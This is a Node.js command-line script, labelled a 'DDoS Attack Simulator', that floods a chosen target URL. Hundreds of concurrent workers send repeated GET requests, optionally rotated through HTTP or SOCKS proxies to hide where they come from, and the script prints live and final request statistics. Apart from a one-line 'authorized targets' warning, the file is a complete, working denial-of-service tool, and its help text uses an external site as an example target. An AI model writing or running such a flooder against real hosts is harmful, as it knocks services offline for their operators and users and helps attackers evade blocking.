#!/usr/bin/env node

const http = require('http');
const https = require('https');
const chalk = require('chalk');
const fs = require('fs');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');

// Load proxies
let proxies = [];
let proxyEnabled = false;
let proxyIndex = 0;

try {
  const proxyConfig = JSON.parse(fs.readFileSync(path.join(__dirname, '../proxies.json'), 'utf8'));
  proxies = proxyConfig.proxies || [];
  proxyEnabled = proxyConfig.enabled || false;
  
  if (proxyEnabled && proxies.length > 0) {
    console.log(chalk.green(`\nLoaded ${proxies.length} proxies from proxies.json`));
  }
} catch (error) {
  console.log(chalk.yellow('\nNo proxy configuration found. Running without proxies.'));
}

function getNextProxy() {
  if (!proxyEnabled || proxies.length === 0) return null;
  
  const proxy = proxies[proxyIndex];
  proxyIndex = (proxyIndex + 1) % proxies.length;
  return proxy;
}

function getRandomProxy() {
  if (!proxyEnabled || proxies.length === 0) return null;
  return proxies[Math.floor(Math.random() * proxies.length)];
}

function createProxyAgent(proxyUrl, targetUrl) {
  if (!proxyUrl) return undefined;
  
  try {
    if (proxyUrl.startsWith('socks')) {
      return new SocksProxyAgent(proxyUrl);
    } else {
      return new HttpsProxyAgent(proxyUrl);
    }
  } catch (error) {
    console.error(chalk.red(`Proxy error: ${error.message}`));
    return undefined;
  }
}

// Parse command line arguments
const args = process.argv.slice(2);
const config = {
  target: 'http://localhost:8080',
  workers: 100,
  duration: 60,
  delay: 10
};

// Parse arguments
for (let i = 0; i < args.length; i++) {
  const arg = args[i];
  const value = args[i + 1];
  
  switch(arg) {
    case '--target':
    case '-t':
      config.target = value;
      i++;
      break;
    case '--workers':
    case '-w':
      config.workers = parseInt(value) || 100;
      i++;
      break;
    case '--duration':
    case '-d':
      config.duration = parseInt(value) || 60;
      i++;
      break;
    case '--delay':
      config.delay = parseInt(value) || 10;
      i++;
      break;
    case '--help':
    case '-h':
      console.log(chalk.cyan('\nDDoS Attack Simulator - CLI Tool\n'));
      console.log('Usage: node attack/cli.js [options]\n');
      console.log('Options:');
      console.log('  -t, --target <url>       Target URL (default: http://localhost:3000)');
      console.log('  -w, --workers <num>      Number of concurrent workers (default: 100)');
      console.log('  -d, --duration <sec>     Duration in seconds (default: 60)');
      console.log('  --delay <ms>             Delay between requests in ms (default: 10)');
      console.log('  -h, --help               Show this help message\n');
      console.log('Proxy Configuration:');
      console.log('  Edit proxies.json to add proxies');
      console.log('  Set "enabled": true to use proxies\n');
      console.log('Examples:');
      console.log('  node attack/cli.js --target http://localhost:3000 --workers 50 --duration 30');
      console.log('  node attack/cli.js -t http://example.com -w 200 -d 60\n');
      process.exit(0);
  }
}

console.clear();
console.log(chalk.red.bold('\n' + '='.repeat(60)));
console.log(chalk.red.bold('           DDOS ATTACK SIMULATOR - CLI TOOL'));
console.log(chalk.red.bold('='.repeat(60) + '\n'));

console.log(chalk.yellow('WARNING: Use only on authorized targets!\n'));

console.log(chalk.gray('-'.repeat(60)));
console.log(chalk.white.bold('Configuration:'));
console.log(chalk.gray('  Target:   ') + chalk.yellow(config.target));
console.log(chalk.gray('  Workers:  ') + chalk.yellow(config.workers));
console.log(chalk.gray('  Duration: ') + chalk.yellow(config.duration + 's'));
console.log(chalk.gray('  Delay:    ') + chalk.yellow(config.delay + 'ms'));
console.log(chalk.gray('  Proxies:  ') + (proxyEnabled ? chalk.green(`Enabled (${proxies.length})`) : chalk.red('Disabled')));
console.log(chalk.gray('-'.repeat(60)) + '\n');

console.log(chalk.green.bold('Attack initiated...\n'));
console.log(chalk.gray('='.repeat(60)) + '\n');

// Attack logic
const endpoints = ['/', '/test', '/api/stats'];

let stats = {
  totalRequests: 0,
  successfulRequests: 0,
  failedRequests: 0,
  errors: {},
  proxyStats: {},
  startTime: Date.now()
};

let isRunning = true;

function makeRequest(workerId) {
  if (!isRunning) return;

  const endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
  const proxyUrl = getRandomProxy();
  const targetURL = new URL(config.target + endpoint);
  
  stats.totalRequests++;
  
  const options = {
    hostname: targetURL.hostname,
    port: targetURL.port || (targetURL.protocol === 'https:' ? 443 : 80),
    path: targetURL.pathname + targetURL.search,
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': '*/*',
      'Connection': 'keep-alive'
    }
  };

  if (proxyUrl) {
    options.agent = createProxyAgent(proxyUrl, config.target);
    if (!stats.proxyStats[proxyUrl]) {
      stats.proxyStats[proxyUrl] = { success: 0, failed: 0 };
    }
  }

  const protocol = targetURL.protocol === 'https:' ? https : http;
  
  const req = protocol.get(options, (res) => {
    let data = '';
    
    res.on('data', (chunk) => {
      data += chunk;
    });
    
    res.on('end', () => {
      if (res.statusCode >= 200 && res.statusCode < 400) {
        stats.successfulRequests++;
        if (proxyUrl) stats.proxyStats[proxyUrl].success++;
      } else {
        stats.failedRequests++;
        stats.errors[res.statusCode] = (stats.errors[res.statusCode] || 0) + 1;
        if (proxyUrl) stats.proxyStats[proxyUrl].failed++;
      }
      
      if (isRunning) {
        setTimeout(() => makeRequest(workerId), config.delay);
      }
    });
  });

  req.on('error', (err) => {
    stats.failedRequests++;
    const errorType = err.code || 'ERROR';
    stats.errors[errorType] = (stats.errors[errorType] || 0) + 1;
    if (proxyUrl) stats.proxyStats[proxyUrl].failed++;
    
    if (isRunning) {
      setTimeout(() => makeRequest(workerId), config.delay);
    }
  });

  req.on('timeout', () => {
    req.destroy();
    stats.failedRequests++;
    stats.errors['TIMEOUT'] = (stats.errors['TIMEOUT'] || 0) + 1;
    if (proxyUrl) stats.proxyStats[proxyUrl].failed++;
    
    if (isRunning) {
      setTimeout(() => makeRequest(workerId), config.delay);
    }
  });
  
  req.setTimeout(5000);
}

for (let i = 0; i < config.workers; i++) {
  setTimeout(() => makeRequest(i), i * 50);
}

const statsInterval = setInterval(() => {
  const elapsed = ((Date.now() - stats.startTime) / 1000).toFixed(1);
  const rps = (stats.successfulRequests / (Date.now() - stats.startTime) * 1000).toFixed(2);
  const successRate = stats.totalRequests > 0 ? ((stats.successfulRequests / stats.totalRequests) * 100).toFixed(2) : '0.00';
  
  const line = `[${chalk.cyan(elapsed + 's')}] ` +
    `Total: ${chalk.yellow(stats.totalRequests)} | ` +
    `Success: ${chalk.green(stats.successfulRequests)} | ` +
    `Failed: ${chalk.red(stats.failedRequests)} | ` +
    `RPS: ${chalk.magenta(rps)} | ` +
    `Rate: ${chalk.green(successRate + '%')}`;
  
  console.log(line);
}, 1000);

setTimeout(() => {
  isRunning = false;
  clearInterval(statsInterval);
  
  const totalTime = ((Date.now() - stats.startTime) / 1000).toFixed(2);
  const avgRps = (stats.successfulRequests / totalTime).toFixed(2);
  const successRate = ((stats.successfulRequests / stats.totalRequests) * 100).toFixed(2);
  
  console.log('\n' + chalk.gray('='.repeat(60)));
  console.log(chalk.green.bold('\nATTACK COMPLETED'));
  console.log(chalk.gray('-'.repeat(60)));
  console.log(chalk.white(`Duration:        ${chalk.yellow(totalTime + 's')}`));
  console.log(chalk.white(`Total Requests:  ${chalk.yellow(stats.totalRequests)}`));
  console.log(chalk.white(`Successful:      ${chalk.green(stats.successfulRequests)} (${chalk.green(successRate + '%')})`));
  console.log(chalk.white(`Failed:          ${chalk.red(stats.failedRequests)}`));
  console.log(chalk.white(`Average RPS:     ${chalk.magenta(avgRps)}`));
  
  if (Object.keys(stats.errors).length > 0) {
    console.log(chalk.gray('-'.repeat(60)));
    console.log(chalk.red.bold('Error Breakdown:'));
    Object.entries(stats.errors)
      .sort((a, b) => b[1] - a[1])
      .forEach(([error, count]) => console.log(chalk.red(`  ${error}: ${count}`)));
  }

  if (proxyEnabled && Object.keys(stats.proxyStats).length > 0) {
    console.log(chalk.gray('-'.repeat(60)));
    console.log(chalk.cyan.bold('Proxy Statistics:'));
    Object.entries(stats.proxyStats)
      .sort((a, b) => (b[1].success + b[1].failed) - (a[1].success + a[1].failed))
      .slice(0, 5)
      .forEach(([proxy, stat]) => {
        const total = stat.success + stat.failed;
        const rate = total > 0 ? ((stat.success / total) * 100).toFixed(1) : '0.0';
        console.log(chalk.cyan(`  ${proxy.substring(0, 40)}... - Success: ${stat.success} | Failed: ${stat.failed} | Rate: ${rate}%`));
      });
  }
  
  console.log(chalk.gray('='.repeat(60)) + '\n');
  setTimeout(() => process.exit(0), 100);
}, config.duration * 1000);

process.on('SIGINT', () => {
  console.log(chalk.yellow('\n\nAttack interrupted by user\n'));
  isRunning = false;
  clearInterval(statsInterval);
  setTimeout(() => process.exit(0), 200);
});
